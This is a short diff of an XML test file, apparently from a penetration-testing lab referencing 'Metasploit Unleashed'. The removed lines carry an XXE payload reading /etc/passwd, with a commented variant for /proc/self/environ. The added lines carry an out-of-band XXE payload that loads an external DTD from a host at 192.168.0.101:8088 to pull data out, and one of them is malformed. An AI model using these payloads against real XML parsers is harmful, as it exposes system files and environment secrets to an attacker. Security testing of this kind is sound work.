@@ -1,10 +1,11 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE bar [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-<!-- <!ENTITY xxe SYSTEM "file:///proc/self/environ"> -->
+<!DOCTYPE book [
+   <!ENTITY % asd SYSTEM "http://192.168.0.101:8088/ext.dtd";>
+   %asd;
+   %rrr;
 ]>
 <book>
-    <author>&xxe;</author>
+    <author>Test Author</author>
     <isbn>11112222333</isbn>
     <title>Metasploit Unleashed</title>
 </book>
